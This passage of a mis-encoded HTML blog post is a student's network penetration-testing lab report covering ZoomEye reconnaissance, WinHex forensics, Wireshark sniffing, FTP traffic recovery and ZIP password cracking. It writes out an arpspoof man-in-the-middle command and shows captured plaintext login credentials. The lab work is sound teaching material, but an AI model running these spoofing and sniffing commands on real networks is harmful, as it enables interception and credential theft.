href="#7ã€åˆ©ç”¨-ZoomEye-æœç´¢ä¸€ä¸ªè¥¿é—¨å­å…¬å¸å·¥æ§è®¾å¤‡ï¼Œå¹¶æè¿°å…¶å¯èƒ½å­˜åœ¨çš„å®‰å…¨é—®é¢˜ã€‚" class="headerlink" title="7ã€åˆ©ç”¨ ZoomEye æœç´¢ä¸€ä¸ªè¥¿é—¨å­å…¬å¸å·¥æ§è®¾å¤‡ï¼Œå¹¶æè¿°å…¶å¯èƒ½å­˜åœ¨çš„å®‰å…¨é—®é¢˜ã€‚"></a>7ã€åˆ©ç”¨ ZoomEye æœç´¢ä¸€ä¸ªè¥¿é—¨å­å…¬å¸å·¥æ§è®¾å¤‡ï¼Œå¹¶æè¿°å…¶å¯èƒ½å­˜åœ¨çš„å®‰å…¨é—®é¢˜ã€‚</h3><p>åˆ©ç”¨ ZoomEye æœç´¢åˆ°çš„è¥¿é—¨å­å…¬å¸å·¥æ§è®¾å¤‡ï¼Œå…¶ IP ã€å¼€æ”¾çš„ç«¯å£å·ã€å›½å®¶ç­‰ä¿¡æ¯æš´éœ²å‡ºæ¥ï¼Œå¯èƒ½å¯¼è‡´æŸäº›æœåŠ¡ï¼ˆä¾‹å¦‚ SSHã€telnetç­‰ï¼‰è¢«çˆ†ç ´å¼±å£ä»¤ï¼Œè¿›è€Œå¯¼è‡´æ­£å¸¸æœåŠ¡è¢«ç ´å</p><h3 id="8ã€Winhexç®€å•æ•°æ®æ¢å¤ä¸å–è¯"><a href="#8ã€Winhexç®€å•æ•°æ®æ¢å¤ä¸å–è¯" class="headerlink" title="8ã€Winhexç®€å•æ•°æ®æ¢å¤ä¸å–è¯"></a>8ã€Winhexç®€å•æ•°æ®æ¢å¤ä¸å–è¯</h3><h4 id="8-1-elephant-jpgä¸èƒ½æ‰“å¼€äº†ï¼Œåˆ©ç”¨WinHexä¿®å¤ï¼Œè¯´æ˜ä¿®å¤è¿‡ç¨‹ã€‚"><a href="#8-1-elephant-jpgä¸èƒ½æ‰“å¼€äº†ï¼Œåˆ©ç”¨WinHexä¿®å¤ï¼Œè¯´æ˜ä¿®å¤è¿‡ç¨‹ã€‚" class="headerlink" title="8.1 elephant.jpgä¸èƒ½æ‰“å¼€äº†ï¼Œåˆ©ç”¨WinHexä¿®å¤ï¼Œè¯´æ˜ä¿®å¤è¿‡ç¨‹ã€‚"></a>8.1 elephant.jpgä¸èƒ½æ‰“å¼€äº†ï¼Œåˆ©ç”¨WinHexä¿®å¤ï¼Œè¯´æ˜ä¿®å¤è¿‡ç¨‹ã€‚</h4><p>è±¡é¼»å±±.jpgçš„æ–‡ä»¶å¤´æŸåï¼Œwinhex æ‰“å¼€æ›´æ”¹æ–‡ä»¶å¤´å³å¯</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201027110849.jpg" alt="elephant"></p><blockquote><p>JPEG (jpg)ï¼Œæ–‡ä»¶å¤´ï¼šFFD8FF</p></blockquote><h4 id="8-2-ç¬‘è„¸èƒŒåçš„é˜´éœ¾ï¼šå›¾ç‰‡smileæœ‰ä»€ä¹ˆéšè—ä¿¡æ¯ã€‚"><a href="#8-2-ç¬‘è„¸èƒŒåçš„é˜´éœ¾ï¼šå›¾ç‰‡smileæœ‰ä»€ä¹ˆéšè—ä¿¡æ¯ã€‚" class="headerlink" title="8.2 ç¬‘è„¸èƒŒåçš„é˜´éœ¾ï¼šå›¾ç‰‡smileæœ‰ä»€ä¹ˆéšè—ä¿¡æ¯ã€‚"></a>8.2 ç¬‘è„¸èƒŒåçš„é˜´éœ¾ï¼šå›¾ç‰‡smileæœ‰ä»€ä¹ˆéšè—ä¿¡æ¯ã€‚</h4><p>ç”¨ winhex æ‰“å¼€ï¼Œæ‹‰åˆ°æœ€ä¸‹é¢å‘ç°äº†<code>killer</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201027111012.png"></p><h4 id="8-3-å°è¯•ä½¿ç”¨æ•°æ®æ¢å¤è½¯ä»¶æ¢å¤ä½ çš„Uç›˜ä¸­æ›¾ç»åˆ é™¤çš„æ–‡ä»¶ã€‚"><a href="#8-3-å°è¯•ä½¿ç”¨æ•°æ®æ¢å¤è½¯ä»¶æ¢å¤ä½ çš„Uç›˜ä¸­æ›¾ç»åˆ é™¤çš„æ–‡ä»¶ã€‚" class="headerlink" title="8.3 å°è¯•ä½¿ç”¨æ•°æ®æ¢å¤è½¯ä»¶æ¢å¤ä½ çš„Uç›˜ä¸­æ›¾ç»åˆ é™¤çš„æ–‡ä»¶ã€‚"></a>8.3 å°è¯•ä½¿ç”¨æ•°æ®æ¢å¤è½¯ä»¶æ¢å¤ä½ çš„Uç›˜ä¸­æ›¾ç»åˆ é™¤çš„æ–‡ä»¶ã€‚</h4><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201104183519.png" alt="å—¨æ ¼å¼"></p><p>é«˜ä¸­çš„æ—¶å€™å¸®åŒå­¦ç”¨è¿™ä¸ª<code>å—¨æ ¼å¼</code>æ¢å¤è¿‡Uç›˜æ–‡ä»¶ï¼Œç°åœ¨è¿™è½¯ä»¶è¿˜æ˜¯ä¸€å¦‚æ—¢å¾€çš„å¥½ç”¨</p><h3 id="9-å®éªŒå°ç»“"><a href="#9-å®éªŒå°ç»“" class="headerlink" title="9. å®éªŒå°ç»“"></a>9. å®éªŒå°ç»“</h3><p>é€šè¿‡æœ¬æ¬¡å®éªŒå­¦ä¹ åˆ°äº†ä¸€äº›è¢«åŠ¨æ‰«æçš„æŠ€å·§ï¼ŒåŒ…æ‹¬ç…§ç‰‡å®šä½ã€é€šè¿‡MACæŸ¥è¯¢è®¾å¤‡ä»¥åŠå¦‚ä½•æ›´å¥½çš„åˆ©ç”¨æœç´¢å¼•æ“ï¼Œè¿˜å­¦ä¹ åˆ°äº† Nmap çš„ä¸»åŠ¨æ‰«ææŠ€å·§ï¼Œè¿˜æœ‰ä¸€äº›å¯¹æ–‡ä»¶éšå†™çš„å¸¸ç”¨æ“ä½œï¼Œæ¯”å¦‚ä¿®å¤æŸåçš„æ–‡ä»¶å¤´ï¼ŒæŸ¥çœ‹éšè—åœ¨æ–‡ä»¶é‡Œçš„äºŒè¿›åˆ¶ä¿¡æ¯ç­‰</p><h1 id="ç½‘ç»œæ¸—é€æµ‹è¯•å®éªŒäºŒï¼šç½‘ç»œå—…æ¢ä¸èº«ä»½è®¤è¯"><a href="#ç½‘ç»œæ¸—é€æµ‹è¯•å®éªŒäºŒï¼šç½‘ç»œå—…æ¢ä¸èº«ä»½è®¤è¯" class="headerlink" title="ç½‘ç»œæ¸—é€æµ‹è¯•å®éªŒäºŒï¼šç½‘ç»œå—…æ¢ä¸èº«ä»½è®¤è¯"></a>ç½‘ç»œæ¸—é€æµ‹è¯•å®éªŒäºŒï¼šç½‘ç»œå—…æ¢ä¸èº«ä»½è®¤è¯</h1><h2 id="å®éªŒç›®çš„-1"><a href="#å®éªŒç›®çš„-1" class="headerlink" title="å®éªŒç›®çš„"></a>å®éªŒç›®çš„</h2><ol><li>é€šè¿‡ä½¿ç”¨ Wireshark è½¯ä»¶æŒæ¡ Sniffer (å—…æ¢å™¨)å·¥å…·çš„ä½¿ç”¨æ–¹æ³•ï¼Œå®ç°æ•æ‰ HTTP ç­‰åè®®çš„æ•°æ®åŒ…ï¼Œä»¥ç†è§£ TCP&#x2F;IP åè®®ä¸­å¤šç§åè®®çš„æ•°æ®ç»“æ„ã€é€šè¿‡å®éªŒäº†è§£ HTTP ç­‰åè®®æ˜æ–‡ä¼ è¾“çš„ç‰¹æ€§ã€‚</li><li>ç ”ç©¶äº¤æ¢ç¯å¢ƒä¸‹çš„ç½‘ç»œå—…æ¢å®ç°åŠé˜²èŒƒæ–¹æ³•ï¼Œç ”ç©¶å¹¶åˆ©ç”¨ ARP åè®®çš„å®‰å…¨æ¼æ´ï¼Œé€šè¿‡ Arpspoof å®ç° ARP æ¬ºéª—ä»¥æ•è·å†…ç½‘å…¶ä»–ç”¨æˆ·æ•°æ®ã€‚</li><li>èƒ½åˆ©ç”¨ BurpSuite å®ç°ç½‘ç»œç™»å½•æš´åŠ›ç ´è§£è·å¾—ç™»é™†å¯†ç </li><li>èƒ½å®ç° ZIP å¯†ç ç ´è§£ï¼Œç†è§£å®‰å…¨å¯†ç çš„æ¦‚å¿µå’Œè®¾ç½®</li></ol><h2 id="ç³»ç»Ÿç¯å¢ƒ-1"><a href="#ç³»ç»Ÿç¯å¢ƒ-1" class="headerlink" title="ç³»ç»Ÿç¯å¢ƒ"></a>ç³»ç»Ÿç¯å¢ƒ</h2><ul><li>Kali Linux2ã€Windows</li></ul><h2 id="ç½‘ç»œç¯å¢ƒ-1"><a href="#ç½‘ç»œç¯å¢ƒ-1" class="headerlink" title="ç½‘ç»œç¯å¢ƒ"></a>ç½‘ç»œç¯å¢ƒ</h2><ul><li>äº¤æ¢ç½‘ç»œç»“æ„</li></ul><h2 id="å®éªŒå·¥å…·-1"><a href="#å®éªŒå·¥å…·-1" class="headerlink" title="å®éªŒå·¥å…·"></a>å®éªŒå·¥å…·</h2><ul><li>Arpspoofã€WireSharkã€Burpsuiteã€fcrackzip(ç”¨äº zip å¯†ç ç ´è§£)</li></ul><h2 id="å®éªŒæ­¥éª¤-1"><a href="#å®éªŒæ­¥éª¤-1" class="headerlink" title="å®éªŒæ­¥éª¤"></a>å®éªŒæ­¥éª¤</h2><h3 id="ç½‘ç»œå—…æ¢éƒ¨åˆ†ï¼š"><a href="#ç½‘ç»œå—…æ¢éƒ¨åˆ†ï¼š" class="headerlink" title="ç½‘ç»œå—…æ¢éƒ¨åˆ†ï¼š"></a>ç½‘ç»œå—…æ¢éƒ¨åˆ†ï¼š</h3><ul><li>ç½‘ç»œå—…æ¢ï¼šWireshark ç›‘å¬ç½‘ç»œæµé‡ï¼ŒæŠ“åŒ…</li><li>ARP æ¬ºéª—ï¼šArpSpoofï¼Œå®æ–½ ARP æ¬ºéª—</li><li>é˜²èŒƒï¼šé˜²èŒƒ ARP æ¬ºéª—</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106143101.png" alt="å®éªŒç½‘ç»œæ‹“æ‰‘"></p><h4 id="1ã€A-ä¸»æœºä¸Šå¤–ç½‘ï¼Œ-B-ä¸»æœºè¿è¡Œ-sniffer-WireShark-é€‰å®šåªæŠ“æºä¸º-A-çš„æ•°æ®"><a href="#1ã€A-ä¸»æœºä¸Šå¤–ç½‘ï¼Œ-B-ä¸»æœºè¿è¡Œ-sniffer-WireShark-é€‰å®šåªæŠ“æºä¸º-A-çš„æ•°æ®" class="headerlink" title="1ã€A ä¸»æœºä¸Šå¤–ç½‘ï¼Œ B ä¸»æœºè¿è¡Œ sniffer(WireShark)é€‰å®šåªæŠ“æºä¸º A çš„æ•°æ®"></a>1ã€A ä¸»æœºä¸Šå¤–ç½‘ï¼Œ B ä¸»æœºè¿è¡Œ sniffer(WireShark)é€‰å®šåªæŠ“æºä¸º A çš„æ•°æ®</h4><p>æœ¬æ¬¡å®éªŒå¼€äº†ä¸€å° Kali å½“ä¸»æœº A ï¼Œå¼€äº†ä¸€å° win7 è™šæ‹Ÿæœºå½“ä¸»æœº B ï¼Œé¦–å…ˆå¼€ nmap æ‰«ä¸€æ‰«ï¼Œç¡®å®šä¸€ä¸‹ç›®æ ‡ä¸»æœº IP å¹¶çœ‹çœ‹èƒ½ä¸èƒ½ ping é€šï¼Œ<code>Aimerl0-PC.lan</code>å°±æ˜¯ win7 ä¸»æœºï¼Œ<code>.lan</code>è¡¨ç¤ºä½¿ç”¨æœ‰çº¿ç½‘ç»œ</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106145957.png"></p><p>è™½ç„¶ nmap ç”¨äº† -sP æ‰«æï¼Œä½†è¿˜æ˜¯ ping ä¸€ä¸‹ï¼Œæ²¡æœ‰ä¸¢åŒ…ï¼Œå¾ˆæ»¡æ„</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106150341.png"></p><p>æ¥ç€ç”¨ win7 ping ä¸€ä¸‹ kali ï¼Œæ‰“å¼€ Wireshark æŠ“ä¸€ä¸‹åŒ…ï¼Œè¿‡æ»¤è¯­å¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src == 192.168.10.204</span><br></pre></td></tr></table></figure><p>   <img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106165111.png" alt="ping"></p><p>å…·ä½“æ‰“å¼€ ping è¿‡å»çš„åŒ…çœ‹çœ‹ï¼Œè¿˜æ˜¯èƒ½å¤Ÿçœ‹åˆ° ping çš„å†…å®¹çš„</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106165333.png">ã€</p><h4 id="2ã€ARP-æ¬ºéª—"><a href="#2ã€ARP-æ¬ºéª—" class="headerlink" title="2ã€ARP æ¬ºéª—"></a>2ã€ARP æ¬ºéª—</h4><h4 id="2-1-ä¸ºäº†æ•è·Aåˆ°å¤–ç½‘çš„æ•°æ®ï¼ŒBå®æ–½ARPæ¬ºéª—æ”»å‡»ï¼ŒBå°†å†’å……è¯¥å­ç½‘çš„ä»€ä¹ˆå®ä½“ï¼Ÿ"><a href="#2-1-ä¸ºäº†æ•è·Aåˆ°å¤–ç½‘çš„æ•°æ®ï¼ŒBå®æ–½ARPæ¬ºéª—æ”»å‡»ï¼ŒBå°†å†’å……è¯¥å­ç½‘çš„ä»€ä¹ˆå®ä½“ï¼Ÿ" class="headerlink" title="2.1 ä¸ºäº†æ•è·Aåˆ°å¤–ç½‘çš„æ•°æ®ï¼ŒBå®æ–½ARPæ¬ºéª—æ”»å‡»ï¼ŒBå°†å†’å……è¯¥å­ç½‘çš„ä»€ä¹ˆå®ä½“ï¼Ÿ"></a>2.1 ä¸ºäº†æ•è·Aåˆ°å¤–ç½‘çš„æ•°æ®ï¼ŒBå®æ–½ARPæ¬ºéª—æ”»å‡»ï¼ŒBå°†å†’å……è¯¥å­ç½‘çš„ä»€ä¹ˆå®ä½“ï¼Ÿ</h4><blockquote><p>åœ¨å±€åŸŸç½‘ä¸­ï¼ŒB ä¸»æœºå†’å……çš„æ˜¯å­ç½‘ä¸­çš„ç½‘å…³</p></blockquote><h4 id="2-2-å†™å‡º-arpspoof-å‘½ä»¤æ ¼å¼"><a href="#2-2-å†™å‡º-arpspoof-å‘½ä»¤æ ¼å¼" class="headerlink" title="2.2 å†™å‡º arpspoof å‘½ä»¤æ ¼å¼"></a>2.2 å†™å‡º arpspoof å‘½ä»¤æ ¼å¼</h4><p>é¦–å…ˆï¼Œæˆ‘çš„æ–° kali é‡Œé¢æ²¡æœ‰å®‰è£… arpspoof ï¼Œæ‰€ä»¥ç®€å•å®‰è£…äº†ä¸€ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install dsniff</span><br></pre></td></tr></table></figure><p>ç„¶åéœ€è¦å¼€å¯ç«¯å£è½¬å‘ï¼Œä¸ç„¶æˆªè·åˆ°çš„æŠ¥æ–‡æ— æ³•è½¬å‘å‡ºå»ï¼ŒB ä¸»æœºå°±æ²¡æ³•ä¸Šç½‘äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>å†ç„¶åå¼€å§‹æ”»å‡»ï¼Œå› ä¸ºè·Ÿå—å®³ä¸»æœºåœ¨åŒä¸€ä¸ªç½‘æ®µï¼Œæ‰€ä»¥ç½‘å…³è‚¯å®šéƒ½æ˜¯<code>192.168.10.1</code>ï¼Œä¹‹å‰åˆæ‰«åˆ°äº†ç›®æ ‡ä¸»æœºçš„ IP ä¸º<code>192.168.10.204</code>ï¼Œæ‰€ä»¥èƒ½å¤Ÿç›´æ¥å¼€é”¤ï¼Œç®€å•çœ‹ä¸€ä¸‹ arpspoof ä½¿ç”¨æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@F0x:~# arpspoof</span><br><span class="line">Version: 2.4</span><br><span class="line">Usage: arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</span><br><span class="line"></span><br><span class="line">arpspoof [-i æŒ‡å®šä½¿ç”¨çš„ç½‘å¡] [-t è¦æ¬ºéª—çš„ç›®æ ‡ä¸»æœº] [-r] è¦ä¼ªè£…æˆçš„ä¸»æœº</span><br></pre></td></tr></table></figure><p>kali çš„ IP æ˜¯<code>192.168.10.165</code>ï¼Œè¦æ¬ºéª—çš„ç›®æ ‡ä¸»æœº IP æ˜¯<code>192.168.10.204</code>ï¼Œç½‘å…³æ˜¯<code>192.168.10.1</code>ï¼Œæ€è·¯ä¸€ä¸‹å­å°±æ¸…æ™°èµ·æ¥äº†ï¼Œæˆ‘ä»¬ç›®çš„å°±æ˜¯æŠŠ kali ä¼ªè£…æˆç½‘å…³ï¼Œç»“åˆ arpspoof </p><ul><li>æ”»å‡»è€…ï¼š<code>192.168.10.165</code></li><li>è¢«æ¬ºéª—ä¸»æœºï¼š<code>192.168.10.204</code></li><li>ç½‘å…³ï¼š<code>192.168.10.1</code></li></ul><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.10.204 -r 192.168.10.1</span><br></pre></td></tr></table></figure><h4 id="2-3-amp-2-4-æ˜¯å¦èƒ½çœ‹åˆ°Aå’Œå¤–ç½‘çš„é€šä¿¡ï¼ˆAåˆšè¾“å…¥çš„å¸æˆ·å’Œå£ä»¤ï¼‰ï¼Ÿåœ¨äº’è”ç½‘ä¸Šæ‰¾åˆ°ä»»æ„ä¸€ä¸ªä»¥æ˜æ–‡æ–¹å¼ä¼ é€’ç”¨æˆ·å¸å·ã€å¯†ç çš„ç½‘ç«™ï¼Œæˆªå›¾Wiresharkä¸­æ˜¾ç¤ºçš„æ˜æ–‡ä¿¡æ¯ã€‚"><a href="#2-3-amp-2-4-æ˜¯å¦èƒ½çœ‹åˆ°Aå’Œå¤–ç½‘çš„é€šä¿¡ï¼ˆAåˆšè¾“å…¥çš„å¸æˆ·å’Œå£ä»¤ï¼‰ï¼Ÿåœ¨äº’è”ç½‘ä¸Šæ‰¾åˆ°ä»»æ„ä¸€ä¸ªä»¥æ˜æ–‡æ–¹å¼ä¼ é€’ç”¨æˆ·å¸å·ã€å¯†ç çš„ç½‘ç«™ï¼Œæˆªå›¾Wiresharkä¸­æ˜¾ç¤ºçš„æ˜æ–‡ä¿¡æ¯ã€‚" class="headerlink" title="2.3&amp;2.4 æ˜¯å¦èƒ½çœ‹åˆ°Aå’Œå¤–ç½‘çš„é€šä¿¡ï¼ˆAåˆšè¾“å…¥çš„å¸æˆ·å’Œå£ä»¤ï¼‰ï¼Ÿåœ¨äº’è”ç½‘ä¸Šæ‰¾åˆ°ä»»æ„ä¸€ä¸ªä»¥æ˜æ–‡æ–¹å¼ä¼ é€’ç”¨æˆ·å¸å·ã€å¯†ç çš„ç½‘ç«™ï¼Œæˆªå›¾Wiresharkä¸­æ˜¾ç¤ºçš„æ˜æ–‡ä¿¡æ¯ã€‚"></a>2.3&amp;2.4 æ˜¯å¦èƒ½çœ‹åˆ°Aå’Œå¤–ç½‘çš„é€šä¿¡ï¼ˆAåˆšè¾“å…¥çš„å¸æˆ·å’Œå£ä»¤ï¼‰ï¼Ÿåœ¨äº’è”ç½‘ä¸Šæ‰¾åˆ°ä»»æ„ä¸€ä¸ªä»¥æ˜æ–‡æ–¹å¼ä¼ é€’ç”¨æˆ·å¸å·ã€å¯†ç çš„ç½‘ç«™ï¼Œæˆªå›¾Wiresharkä¸­æ˜¾ç¤ºçš„æ˜æ–‡ä¿¡æ¯ã€‚</h4><p>ç„¶åæˆ‘åœ¨ win7 ä¸Šç™»é™†äº†ä¸€ä¸‹ <code>æŸæŸå¤§å­¦çš„bkjw2</code>ï¼Œæ£€æŸ¥äº†ä¸€ä¸‹å‘ç°å¯ä»¥è¿ä¸Šç½‘ï¼Œç„¶åå›åˆ° kali å¼€å§‹æµé‡åˆ†æï¼Œç„¶åæŠ“åˆ°äº†è‡ªå·±çš„è´¦å·å¯†ç ï¼Œæœç„¶æ˜¯æ˜æ–‡ä¼ è¾“çš„ï¼Œå¯†ç è‡ªè¡Œæ‰“ç äº†</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106172557.png" alt="æ˜æ–‡å¯†ç "></p><h4 id="3ã€FTPæ•°æ®è¿˜åŸéƒ¨åˆ†ï¼šåˆ©ç”¨WireSharkæ‰“å¼€å®éªŒå®éªŒæ•°æ®data-pcapng"><a href="#3ã€FTPæ•°æ®è¿˜åŸéƒ¨åˆ†ï¼šåˆ©ç”¨WireSharkæ‰“å¼€å®éªŒå®éªŒæ•°æ®data-pcapng" class="headerlink" title="3ã€FTPæ•°æ®è¿˜åŸéƒ¨åˆ†ï¼šåˆ©ç”¨WireSharkæ‰“å¼€å®éªŒå®éªŒæ•°æ®data.pcapng"></a>3ã€FTPæ•°æ®è¿˜åŸéƒ¨åˆ†ï¼šåˆ©ç”¨WireSharkæ‰“å¼€å®éªŒå®éªŒæ•°æ®data.pcapng</h4><h4 id="3-1-FTPæœåŠ¡å™¨çš„IPåœ°å€æ˜¯å¤šå°‘ï¼Ÿä½ æ˜¯å¦‚ä½•å‘ç°å…¶ä¸ºFTPæœåŠ¡å™¨çš„ï¼Ÿ"><a href="#3-1-FTPæœåŠ¡å™¨çš„IPåœ°å€æ˜¯å¤šå°‘ï¼Ÿä½ æ˜¯å¦‚ä½•å‘ç°å…¶ä¸ºFTPæœåŠ¡å™¨çš„ï¼Ÿ" class="headerlink" title="3.1  FTPæœåŠ¡å™¨çš„IPåœ°å€æ˜¯å¤šå°‘ï¼Ÿä½ æ˜¯å¦‚ä½•å‘ç°å…¶ä¸ºFTPæœåŠ¡å™¨çš„ï¼Ÿ"></a>3.1  FTPæœåŠ¡å™¨çš„IPåœ°å€æ˜¯å¤šå°‘ï¼Ÿä½ æ˜¯å¦‚ä½•å‘ç°å…¶ä¸ºFTPæœåŠ¡å™¨çš„ï¼Ÿ</h4><p>ç”¨ ftp è¿‡æ»¤æµï¼Œå‘ç°ä¸€å †æµé‡</p><p>Response æ˜¯å“åº”çš„æ„æ€ï¼Œåº”è¯¥å°±æ˜¯ FTP æœåŠ¡å™¨å“åº”å®¢æˆ·ç«¯è¯·æ±‚ï¼Œæ‰€ä»¥ IP åœ°å€æ˜¯<code>192.168.182.1</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106175557.png"></p><h4 id="3-2-å®¢æˆ·ç«¯ç™»å½•FTPæœåŠ¡å™¨çš„è´¦å·å’Œå¯†ç åˆ†åˆ«æ˜¯ä»€ä¹ˆ"><a href="#3-2-å®¢æˆ·ç«¯ç™»å½•FTPæœåŠ¡å™¨çš„è´¦å·å’Œå¯†ç åˆ†åˆ«æ˜¯ä»€ä¹ˆ" class="headerlink" title="3.2 å®¢æˆ·ç«¯ç™»å½•FTPæœåŠ¡å™¨çš„è´¦å·å’Œå¯†ç åˆ†åˆ«æ˜¯ä»€ä¹ˆ?"></a>3.2 å®¢æˆ·ç«¯ç™»å½•FTPæœåŠ¡å™¨çš„è´¦å·å’Œå¯†ç åˆ†åˆ«æ˜¯ä»€ä¹ˆ?</h4><p>ä¸€å›¾ä¸¤ç”¨ï¼Œè´¦å·<code>student</code>ï¼Œå¯†ç <code>sN46i5y</code>ï¼Œä¸Šé¢è¿˜æœ‰ä¸ªåŒ¿åç”¨æˆ·<code>anonymous</code>ç™»é™†çš„</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106175557.png"></p><h4 id="3-3-å®¢æˆ·ç«¯ä»FTPä¸‹è½½æˆ–æŸ¥çœ‹äº†2ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªä¸ºZIPæ–‡ä»¶ï¼Œä¸€ä¸ªä¸ºTXTæ–‡ä»¶ï¼Œæ–‡ä»¶ååˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿæç¤ºï¼šæ–‡ä»¶åæœ‰å¯èƒ½æ˜¯ä¸­æ–‡"><a href="#3-3-å®¢æˆ·ç«¯ä»FTPä¸‹è½½æˆ–æŸ¥çœ‹äº†2ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªä¸ºZIPæ–‡ä»¶ï¼Œä¸€ä¸ªä¸ºTXTæ–‡ä»¶ï¼Œæ–‡ä»¶ååˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿæç¤ºï¼šæ–‡ä»¶åæœ‰å¯èƒ½æ˜¯ä¸­æ–‡" class="headerlink" title="3.3 å®¢æˆ·ç«¯ä»FTPä¸‹è½½æˆ–æŸ¥çœ‹äº†2ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªä¸ºZIPæ–‡ä»¶ï¼Œä¸€ä¸ªä¸ºTXTæ–‡ä»¶ï¼Œæ–‡ä»¶ååˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿæç¤ºï¼šæ–‡ä»¶åæœ‰å¯èƒ½æ˜¯ä¸­æ–‡."></a>3.3 å®¢æˆ·ç«¯ä»FTPä¸‹è½½æˆ–æŸ¥çœ‹äº†2ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªä¸ºZIPæ–‡ä»¶ï¼Œä¸€ä¸ªä¸ºTXTæ–‡ä»¶ï¼Œæ–‡ä»¶ååˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿæç¤ºï¼šæ–‡ä»¶åæœ‰å¯èƒ½æ˜¯ä¸­æ–‡.</h4><p>åˆ†ææµé‡çœ‹åˆ°<code>1.zip</code>å’Œ<code>å¤ä¹ é¢˜.txt</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106175939.png"></p><h4 id="3-4-è¿˜åŸZIPæ–‡ä»¶å¹¶æ‰“å¼€ï¼ˆZIPæœ‰è§£å‹å¯†ç ï¼Œè¯•å›¾ç ´è§£ï¼Œæç¤ºï¼šå¯†ç å…¨ä¸ºæ•°å­—ï¼Œå¹¶ä¸º6ä½ï¼‰ã€‚æˆªå›¾ç ´è§£è¿‡ç¨‹ã€‚"><a href="#3-4-è¿˜åŸZIPæ–‡ä»¶å¹¶æ‰“å¼€ï¼ˆZIPæœ‰è§£å‹å¯†ç ï¼Œè¯•å›¾ç ´è§£ï¼Œæç¤ºï¼šå¯†ç å…¨ä¸ºæ•°å­—ï¼Œå¹¶ä¸º6ä½ï¼‰ã€‚æˆªå›¾ç ´è§£è¿‡ç¨‹ã€‚" class="headerlink" title="3.4 è¿˜åŸZIPæ–‡ä»¶å¹¶æ‰“å¼€ï¼ˆZIPæœ‰è§£å‹å¯†ç ï¼Œè¯•å›¾ç ´è§£ï¼Œæç¤ºï¼šå¯†ç å…¨ä¸ºæ•°å­—ï¼Œå¹¶ä¸º6ä½ï¼‰ã€‚æˆªå›¾ç ´è§£è¿‡ç¨‹ã€‚"></a>3.4 è¿˜åŸZIPæ–‡ä»¶å¹¶æ‰“å¼€ï¼ˆZIPæœ‰è§£å‹å¯†ç ï¼Œè¯•å›¾ç ´è§£ï¼Œæç¤ºï¼šå¯†ç å…¨ä¸ºæ•°å­—ï¼Œå¹¶ä¸º6ä½ï¼‰ã€‚æˆªå›¾ç ´è§£è¿‡ç¨‹ã€‚</h4><p>æ ¹æ® zip çš„<code>504B0304</code>å¯ä»¥æ‰¾åˆ°æµé‡ï¼Œå†ä»¥åŸå§‹æ•°æ®ä¿å­˜æˆ<code>2.zip</code>åˆ°æ¡Œé¢</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106180544.png" alt="504B0304"></p><p>ç„¶åæˆ‘ç”¨äº†<code>ARCHPR</code>è½¯ä»¶æ¥çˆ†ç ´ï¼Œçˆ†ç ´åˆ°å¯†ç ä¸º<code>123456</code>ï¼Œè§£å‹å¾—åˆ°å›¾ç‰‡</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106181039.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106181131.jpg" alt="ğŸ§"></p><h4 id="3-5-TXTæ–‡ä»¶çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#3-5-TXTæ–‡ä»¶çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="3.5 TXTæ–‡ä»¶çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿ"></a>3.5 TXTæ–‡ä»¶çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿ</h4><p>åˆ†ææµé‡ï¼Œæ‰¾åˆ°<code>å¤ä¹ é¢˜.txt</code>çš„ &#x3D;&#x3D;FTP-DATA&#x3D;&#x3D;ï¼Œè¡¨ç¤ºæ–‡ä»¶ä¼ è¾“ï¼Œçœ‹åˆ°æ•°æ®å†…å®¹</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106181637.png" alt="data"></p><h3 id="ç½‘ç«™å¯†ç ç ´è§£éƒ¨åˆ†ï¼š"><a 